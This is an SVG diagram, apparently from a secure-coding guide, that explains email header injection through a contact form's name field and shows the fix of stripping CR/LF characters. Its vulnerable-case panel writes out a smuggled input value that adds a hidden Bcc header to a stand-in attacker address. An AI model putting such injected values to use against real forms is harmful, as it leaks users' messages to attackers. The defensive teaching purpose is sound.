<svg viewBox="0 0 800 460" xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="t-hdr">
  <title id="t-hdr">Email header injection via newline in user input</title>
  <style>
    .text{fill:#1a1a24;font-family:Inter,system-ui,sans-serif;font-size:13px}
    .label{fill:#5c5c66;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:10.5px;letter-spacing:.08em}
    .mono{fill:#1a1a24;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:11.5px}
    .acc{fill:#6028d9;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:11px}
    .danger{fill:#c14545;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:10.5px;letter-spacing:.08em}
    .s{stroke:#1a1a24;fill:none;stroke-width:1.25}
    .sm{stroke:#b3b3bd;fill:none;stroke-width:1;stroke-dasharray:4 4}
    .dg{stroke:#c14545;fill:none;stroke-width:1.25}
    .a{stroke:#6028d9;fill:none;stroke-width:1.5}
    .fa{fill:#6028d9}
    .fd{fill:#c14545}
    .fs{fill:#f5f1e6}
    @media (prefers-color-scheme: dark){
      .text{fill:#e8e4d8}.label{fill:#9c9ca6}.mono{fill:#e8e4d8}.acc{fill:#b89be8}.danger{fill:#d97a7a}
      .s{stroke:#e8e4d8}.sm{stroke:#4a4a55}.dg{stroke:#d97a7a}.a{stroke:#b89be8}
      .fa{fill:#b89be8}.fd{fill:#d97a7a}.fs{fill:#1a1a24}
    }
  </style>

  <!-- Top: vulnerable -->
  <text x="40" y="36" class="label">01 — VULNERABLE · NAME INTERPOLATED INTO SUBJECT</text>

  <rect x="40" y="62" width="220" height="80" rx="4" class="s"/>
  <text x="60" y="84" class="label">USER FORM INPUT · "name"</text>
  <text x="60" y="106" class="mono">Foo</text>
  <text x="60" y="122" class="danger">\r\nBcc: attacker@evil.com</text>
  <text x="60" y="138" class="mono">"</text>

  <line x1="260" y1="100" x2="320" y2="100" class="a"/>
  <polygon points="320,100 310,95 310,105" class="fa"/>
  <text x="290" y="92" text-anchor="middle" class="label">SUBJECT</text>

  <rect x="320" y="62" width="440" height="156" rx="4" class="s"/>
  <text x="340" y="84" class="label">EMAIL AS SENT</text>
  <text x="340" y="104" class="mono">From: portfolio@example.com</text>
  <text x="340" y="120" class="mono">To: portfolio@example.com</text>
  <text x="340" y="136" class="mono">Subject: New inquiry · Foo</text>
  <text x="340" y="156" class="danger">Bcc: attacker@evil.com</text>
  <text x="340" y="176" class="label">— BLANK LINE = HEADERS / BODY SEPARATOR —</text>
  <text x="340" y="196" class="text">&lt;p&gt;… body …&lt;/p&gt;</text>
  <text x="340" y="212" class="danger">×× ATTACKER SILENTLY CC'd ON EVERY SUBMISSION</text>

  <line x1="40" y1="246" x2="760" y2="246" class="sm"/>

  <!-- Bottom: fixed -->
  <text x="40" y="276" class="label">02 — FIXED · STRIP CR/LF AT THE BOUNDARY</text>

  <rect x="40" y="302" width="220" height="80" rx="4" class="s"/>
  <text x="60" y="324" class="label">SAME USER INPUT</text>
  <text x="60" y="346" class="mono">Foo</text>
  <text x="60" y="362" class="acc">stripHeaderNewlines()</text>
  <text x="60" y="378" class="mono">→ "Foo Bcc: attacker@…"</text>

  <line x1="260" y1="340" x2="320" y2="340" class="a"/>
  <polygon points="320,340 310,335 310,345" class="fa"/>
  <text x="290" y="332" text-anchor="middle" class="label">SUBJECT</text>

  <rect x="320" y="302" width="440" height="116" rx="4" class="fs"/>
  <rect x="320" y="302" width="440" height="116" rx="4" class="a"/>
  <text x="340" y="324" class="label">EMAIL AS SENT · SAFE</text>
  <text x="340" y="344" class="mono">From: portfolio@example.com</text>
  <text x="340" y="360" class="mono">To: portfolio@example.com</text>
  <text x="340" y="378" class="mono">Subject: New inquiry · Foo Bcc: attacker@…</text>
  <text x="340" y="402" class="acc">ONE SUBJECT LINE · NO INJECTED HEADERS</text>

  <text x="40" y="448" class="label">RULE · ANY USER VALUE THAT LANDS IN A HEADER GETS CR/LF STRIPPED</text>
</svg>
